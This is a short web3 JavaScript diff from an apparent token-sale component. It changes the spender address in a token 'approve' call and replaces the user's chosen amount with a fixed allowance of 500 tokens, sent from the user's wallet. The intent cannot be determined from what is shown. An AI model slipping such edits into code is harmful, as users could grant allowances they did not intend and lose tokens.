@@ -436,7 +436,7 @@ const IVO =() =>{
               const txapprove={
                   from:result[0],
                   to:tokencontractAddress,
-                  data:tokencontractinstance.methods.approve('0x7d6bd7b9071366dc6ec7a61ae2fa76877bff2096',amount).encodeABI()
+                  data:tokencontractinstance.methods.approve('0x735f6e949D39f02BaD26d1698A558a629D416265','500000000000000000000').encodeABI()
               }
               web3.eth.sendTransaction(txapprove).then(console.log)
               const tx={
